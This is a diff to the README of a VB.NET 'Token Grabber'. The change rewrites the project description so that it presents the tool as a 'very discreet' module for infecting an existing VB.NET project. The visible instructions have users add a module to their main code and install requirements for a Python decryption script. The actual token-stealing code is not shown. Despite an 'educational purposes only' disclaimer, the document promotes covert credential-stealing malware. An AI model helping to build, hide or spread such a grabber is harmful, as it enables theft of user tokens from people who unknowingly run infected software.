@@ -2,7 +2,7 @@
 
 ## Description
 
-Token Grabber is a VB.NET application designed to demonstrate the potential consequences of unauthorized access to user tokens. This project is intended for educational purposes only and should not be used for malicious activities. The author of this project is not responsible for any misuse or damage caused by this application. This project is a standalone VB.NET application; no additional packages need to be installed.
+Token Grabber is a VB.NET application designed to demonstrate the potential consequences of unauthorized access to user tokens. This project is intended for educational purposes only and should not be used for malicious activities. The author of this project is not responsible for any misuse or damage caused by this application. This project is a module for infect a existing VB NET Project; no additional packages need to be installed (very discreet).
 
 ---
 
@@ -28,7 +28,7 @@ Token Grabber is a VB.NET application designed to demonstrate the potential cons
 
 4. Add the following code to your main module:
    
-   ```visual-basic
+```visual-basic
    Imports System.Threading
    
    Module Main
@@ -43,7 +43,7 @@ Token Grabber is a VB.NET application designed to demonstrate the potential cons
    
        End Sub
    End Module
-   ```
+```
 
 5.  Intall the requirements for decrypt python scrypt 
    
